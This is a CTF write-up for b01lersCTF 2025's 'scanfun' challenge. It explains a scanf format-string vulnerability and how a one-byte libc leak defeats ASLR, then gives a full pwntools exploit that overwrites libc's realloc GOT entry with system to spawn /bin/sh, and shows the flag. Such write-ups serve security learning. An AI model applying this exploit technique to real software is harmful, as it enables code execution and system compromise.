---
title: b01lersCTF-2025
published: 2025-04-23
description: ''
image: ''
tags: [CTF,Writups]
category: 'Writups'
draft: false 
lang: ''
---




# scanfun

## Files
- <a href="/Blog/b01lersCTF-2025/scanfun/Dockerfile">Dockerfile</a>
- <a href="/Blog/b01lersCTF-2025/scanfun/ld-linux-x86-64.so.2">ld-linux-x86-64.so.2</a>
- <a href="/Blog/b01lersCTF-2025/scanfun/libc.so.6">libc.so.6</a>
- <a href="/Blog/b01lersCTF-2025/scanfun/scanner">scanner</a>
- <a href="/Blog/b01lersCTF-2025/scanfun/scanner">scanner</a>
- <a href="/Blog/b01lersCTF-2025/scanfun/scanner.c">scanner.c</a>
- <a href="/Blog/b01lersCTF-2025/scanfun/x.py">x.py</a>

## Chall

This is a `fmt` challenge using the `scanf` function. i didnt find any `scanf` with a `fmt` when i looked online for resources so this is quite an interesting challenge. 

Weirdly enough, when I looked online to see if `scanf` has any positional arguments support, nothing popped up, so I just didn’t take it into consideration. That was until I wrote a simple test C program—and yes, `scanf` does support positional format specifiers.

Alright, back to the challenge. We are given the `scanner.c` file above.

```c
#include <stdio.h>
#include <stdlib.h>

void scan() {
    char scanner[0x50] = {0};
    while (1) {
        fprintf(stdout, "What do you want to scan?\n");
        scanf("%50s\n", scanner);
        scanf(scanner);
        
    }
}


int main() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    
    printf("Welcome to The Scanner (TM)!!!\n");
    printf("A hint for you. Just a byte, no more [0x%hhx]\n", (((unsigned long)stdout) >> 16) & 0xFF);
    scan();
}
```

It asks us to insert a 50-character string, then passes it to scanf. This means if the input string contains format specifiers, the second scanf will interpret them.

So, we can potentially write something onto the stack. If we can partially overwrite some address with a specific value and then use that value as an index in a subsequent write operation, we can achieve arbitrary write on the stack.

for more details here is a explanation from the discord user `gfelber`
> 1. abuse argv to get relative writes int stack
> ```
> (argv) 0x7fffffffee38 -> 0x7fffffffefe4 (argv[0]) -> 'asdfasdf'
> "%420$hx " <- "6969"
> (argv) 0x7fffffffee38 -> 0x7fffffff6969 (argv[0]) -> 'xxxxxxxx' // different
> "%1337$lx" <- "deadbeef"
> (argv) 0x7fffffffee38 -> 0x7fffffff6969 (argv[0]) -> 0xdeadbeef // arb write in stack
> ```
> 2. we use the query buffer as a stack position oracle (if we write a scanf format string into it we can use it as an oracle)
> 3. because we could hit the query buffer at multiple offsets we move up to the ret ptr back to scan from scanf
> 4. we now know the first 2 bytes of the stack location of the ret address of scan which is good enought for future exploitation


Now with that out of the way, the challenge also leaks the third byte of `stdout`.  

Combined with the ability to partially overwrite an address on the stack, this gives us **almost arbitrary write** into `libc`.
I thought that leaking the third byte wouldn't really break ASLR, but Linux allocates 2MB pages for system libraries.  
So instead of having just a byte and a half (0x1000) of offset, we actually have almost 3 bytes (0x200000) of offset.  
Combined with the ability to write to any address on the stack, this gives us an **arbitrary write** in `libc`.
But first, we need to find a writable `libc` address to make it point to where we want.  
Now comes the second trick with `scanf`: we can use `%ms` to write an arbitrarily sized string into an automatically allocated memory region.  
`libc` will allocate memory the size of the input string and copy the string into it—it uses `realloc` for that.

## The plan

- **Get the offset of `system`** using the leaked byte.  
- **Overwrite the GOT entry of `realloc`** with `system`, then call `scanf("%{idx}$ms")` with `/bin/sh`. This is equivalent to `realloc("/bin/sh")`, which gives us a shell thanks to the GOT overwrite.  
- **Find a writable `libc` address** first.  For that, use `scanf("%{idx}$ms")` with a large string.  `libc` will use `mmap` for the allocation.  (For those who don't know: `mmap` addresses are close to `libc`.)  
- Then **make that allocated address point to `libc.got.realloc`** by overwriting a pointer on the stack.  
- **Overwrite, and GG.**

## `getAddr` Function
```python
def getAddr(addr):
    STDOUT = (libc.sym["_IO_2_1_stdout_"] >> (8 * 2) & 0xff) # fixed addr from libc
    BASE = BYTE - STDOUT                                     # get base using the leaked byte
    ADDR_BYTE = BASE + ((addr >> (8 * 2)) & 0xff)            # calculate new offset byte
    return (ADDR_BYTE << 16) + (addr & 0x00ffff)             # reconstruct the target addr
```

and here is the final payload

<details>
<summary>payload</summary>

```python
from pwn import *

# Explained earlier in the blog
def getAddr(addr):
    STDOUT = (libc.sym["_IO_2_1_stdout_"] >> (8 * 2) & 0xff)
    print(hex(BYTE), hex(STDOUT))
    BASE = BYTE - STDOUT 
    ADDR_BYTE = BASE + ((addr >> (8 * 2)) & 0xff)
    return (ADDR_BYTE << 16) + (addr & 0x00ffff)

elf = context.binary = ELF("scanner")
context.log_level = "ERROR"

while True:
    p = process()
    # p = remote("scanfun.harkonnen.b01lersc.tf", 8443, ssl=True)

    p.recvuntil("no more [")
    BYTE = int(p.recvuntil("]")[2:-1], 16)

    libc = elf.libc

    p.recvuntil(" scan?")
    # Make scanf allocate memory using mmap
    p.sendline(b'%16$ms')
    p.sendline(b'a' * 0x40000)

    # Overwrite GOT entry: realloc -> system
    p.recvuntil(" scan?")
    p.sendline("%16$3c")  # Stack offset, write 3 bytes
    p.sendline(getAddr(libc.got["realloc"]).to_bytes(3, byteorder="little"))

    p.recvuntil(" scan?")
    p.sendline("%18$3c")  # Overwrite with system's address
    p.sendline(getAddr(libc.sym["system"]).to_bytes(3, byteorder="little"))

    print("OK")
    # Trigger realloc("/bin/sh")
    p.sendline(b'%23$ms')
    p.sendline(b"/bin/sh\x00" + b"A" * 0x100)  # Spawn shell

    A = p.clean(1)
    print(A)
    if b"/bin/sh" in A:
        p.interactive()
    else:
        p.close()  # Might fail due to stack argument offsets
```
</details> 

```bctf{bUt_wh0_sc4nfs_the_5canf3r5_psof2s}```